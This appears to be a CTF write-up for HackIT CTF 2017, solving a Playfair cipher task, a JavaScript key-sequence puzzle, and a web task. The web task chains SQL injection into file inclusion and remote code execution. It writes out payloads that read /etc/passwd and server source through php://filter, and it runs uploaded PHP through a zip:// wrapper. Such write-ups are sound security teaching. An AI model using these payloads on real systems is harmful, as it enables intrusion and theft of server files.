<h1>HackIT CTF 2017 Writeups</h1>

<h3>Crypto (100):  </h3><br>
Description shows that its a playfair cipher with same original message, we can use some online tools to bruteforce it <br>
https://www.quinapalus.com/playfair.html worked just fine, after extracting each message we get the keyword to cipher it<br>
and finally we append the keywords together and put them in flag format <br>
<code><br>
h4ck1t{hackitisverydangercrypto}
</code>



<h3>Web (100): </h3><br>
This challenge is about SQLi+LFI and turn that to RCE with the upload function
Looks like easy sql injection, but after fetching all tables and columns, only thing we got is a table named countries with 3 columns, nothing interesting<br>
but when we try to get current query with SQLi using <b>SELECT info FROM information_schema.processlist</b><br>
We see the query : Select scripPath from countries where countryname='something'<br>
thats looks like an LFI to mee, when we inject <code>countryname='' union select '/etc/passwd' -- - </code> we get passwd file<br>
<br>I used PHP wrappers to pull index.php and country/fr.php<br>
using countryname='' union select 'php://filter/read=convert.base64-encode/resource=country/fr.php'<br>
when we get source code we can base64 decode it and see where the file uploaded are stored<br>
This is the final part, we need to leverage the upload to a Remote code execution, I used a zip file containing php and uploaded it<br>
and used a zip wrapper to execute my php, http://tasks.ctf.com.ua:13372/index.php?country=%27%20union%20select%20%27zip://uploads/l33t.zip%23secret.php%27%20--%20- <br>
my php file contains scandir function thats equivalent to 'ls' <br>
i got this response :
<code>Array ( [0] => . [1] => .. [2] => .htaccess [3] => country [4] => index.php [5] => iulersiueruigfuihseruhgi.php [6] => static [7] => uploads )</code>
<br>
that php file looked interesting, let's open it : http://tasks.ctf.com.ua:13372/index.php?country=%27%20union%20select%20%27php://filter/read=convert.base64-encode/resource=iulersiueruigfuihseruhgi.php%27%20--%20-
<br>
got this : PD9waHAKCiRmbGFnPSJoNGNrMXR7JFFMJkxGST1GUjEzTkQkfSI7Cgo/Pgo= <br>
base64 decode it and find some php code with flag<code>"$flag=h4ck1t{$QL&LFI=FR13ND$};"</code>
that's our flag

<h3>Web (150): </h3><br>
Hard task, was looking in all js files, then I found js/jquery.js which handles what the client types in main page<br>
After analyzing it we find an interesting function with this variable inside : <br>
<code>$m=[70,70,71,79,86,74,71,83,80,74,77,86,81,95];//times alt is pressed for Access Granted</code>
<br>Tried to decode ascii code random word <br> but there is an interesting condition if(key==$m[$c]-$c)<br>
tried to loop over the array and substract the index from each value to get <br>
$x=[70, 69, 69, 76, 82, 69, 65, 76, 72, 65, 67, 75, 69, 82]<br>
decoding the ascii : we get "FEELREALHACKER" <br>
put that in lower case and wrap it in flag format, and that's the flag <code>h4ck1t{feelrealhacker}</code>
